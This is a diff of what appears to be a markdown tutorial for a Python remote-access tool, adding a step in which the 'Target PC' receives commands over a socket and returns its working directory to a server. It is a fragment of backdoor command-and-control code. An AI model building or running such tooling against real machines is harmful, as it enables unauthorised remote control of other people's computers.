@@ -94,10 +94,24 @@ print (addr, "Has connected to the server successfully ")
 
 ##
 
-:star: Let's see on the Target PC, in which directory we are working by running the command:
+:star: Let's see on the Target PC, in which directory we are working by running the command ``` view_cwd ```to run the next part 
+of our script:
 
-```
-view_cwd
+
+```python
+while 1:
+    
+    command = s.recv(1024)
+    command = command.decode()
+    print (" ")
+
+    if command == "view_cwd":
+
+        files = os.getcwd()
+        files = str(files)
+        s.send(files.encode())
+        print ("Command has been executed successfully...")
+
 ```
 
 ##
